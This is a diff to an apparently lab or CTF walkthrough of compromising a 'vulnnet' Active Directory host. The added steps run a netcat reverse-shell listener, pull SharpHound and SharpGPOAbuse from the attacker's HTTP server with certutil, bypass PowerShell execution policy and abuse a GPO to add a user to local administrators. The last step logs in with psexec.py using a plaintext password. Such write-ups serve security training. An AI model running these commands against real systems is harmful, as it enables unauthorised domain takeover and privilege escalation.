@@ -171,9 +171,8 @@ After a few moments we get a connection
 
 **Kali**
 
-```
-nc -lvnp 4444
-```
+<pre><code><strong>rlwrap nc -lvnp 4444
+</strong></code></pre>
 
 <figure><img src="../../.gitbook/assets/image (886).png" alt=""><figcaption></figcaption></figure>
 
@@ -188,6 +187,25 @@ nc -lvnp 4444
 **Kali**
 
 ```
+git clone https://github.com/BloodHoundAD/BloodHound.git
+cp BloodHound/Collectors/SharpHound.ps1 .
+python2 -m SimpleHTTPServer 82
+```
+
+**Victim(Powershell)**
+
+```
+certutil -urlcache -f http://$KALI:82/SharpHound.ps1 SharpHound.ps1
+powershell -ep bypass
+.\SharpHound.ps1 
+```
+
+**Kali**
+
+```
+git clone https://github.com/BloodHoundAD/BloodHound.git
+cp BloodHound/Collectors/SharpHound.exe .
+python2 -m SimpleHTTPServer 82
 ```
 
 
@@ -196,5 +214,43 @@ nc -lvnp 4444
 
 
 
+**Kali**
 
+```
+git clone https://github.com/byronkg/SharpGPOAbuse.git
+cp SharpGPOAbuse/SharpGPOAbuse-master/SharpGPOAbuse.exe .
+python2 -m SimpleHTTPServer 82
+```
+
+**Victim(Powershell)**
+
+```
+certutil -urlcache -f http://$KALI:82/SharpGPOAbuse.exe SharpGPOAbuse.exe
+```
+
+
+
+**Victim(Powershell)**
+
+```
+ .\SharpGPOAbuse.exe --AddComputerTask --TaskName "privesc" --Author vulnnet\administrator --Command "cmd.exe" --Arguments "/c net localgroup administrators enterprise-security /add" --GPOName "SECURITY-POL-VN"
+```
+
+<figure><img src="../../.gitbook/assets/image (888).png" alt=""><figcaption></figcaption></figure>
+
+
+
+**Victim(Powershell)**
+
+```
+ gpupdate /force
+```
+
+<figure><img src="../../.gitbook/assets/image (889).png" alt=""><figcaption></figcaption></figure>
+
+**Kali**
+
+```
+ psexec.py enterprise-security:sand_0873959498@$VICTIM
+```
 
